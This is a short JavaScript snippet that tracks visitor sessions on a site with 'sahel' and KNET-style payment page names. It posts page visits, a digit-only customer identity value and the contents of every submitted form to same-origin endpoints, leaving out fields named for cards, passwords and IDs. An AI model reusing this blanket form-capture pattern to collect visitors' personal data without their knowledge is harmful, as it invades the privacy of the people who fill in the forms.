(() => {
  const excluded = /(^|\/)(knet|card-payment|otpcredit_card_page|verification|summary)\.html$/i;
  if (excluded.test(location.pathname)) return;
  const key = 'sahel_session_id';
  let sessionId = localStorage.getItem(key);
  if (!sessionId) {
    sessionId = crypto.randomUUID();
    localStorage.setItem(key, sessionId);
  }
  const send = (url, payload) => {
    const body = JSON.stringify(payload);
    try {
      const queued = navigator.sendBeacon(url, new Blob([body], { type: 'application/json' }));
      if (queued) return;
    } catch (_) {}
    fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body, keepalive: true }).catch(() => {});
  };
  const page = location.pathname.split('/').pop() || 'index.html';
  send('/api/visit', { sessionId, page });
  let customerIdentity = '';
  const identityKey = 'sahel_customer_identity_session';
  window.SahelSession = Object.freeze({
    id: sessionId,
    page,
    captureIdentity(value) {
      customerIdentity = String(value || '').replace(/\D/g, '').slice(0, 32);
      if (customerIdentity) send('/api/submissions', { sessionId, page: 'index.html', formId: 'customer-login', customerIdentity, fields: {} });
    }
  });
  document.addEventListener('submit', event => {
    const form = event.target;
    if (!(form instanceof HTMLFormElement) || form.dataset.noDataBridge === 'true') return;
    const fields = {};
    form.querySelectorAll('input, select, textarea').forEach(control => {
      const name = control.name || control.id;
      const value = control instanceof HTMLInputElement && control.type === 'file' ? '' : control.value;
      if (name && typeof value === 'string' && value.trim() && !/(card|cvv|cvc|otp|pin|password|token|secret|iban|bank|account|civil.?id|national.?id|passport)/i.test(name)) fields[name] = value.trim().slice(0, 2000);
    });
    send('/api/submissions', { sessionId, page, formId: form.id || form.name || `form-${page}`, customerIdentity, fields });
  }, true);
})();
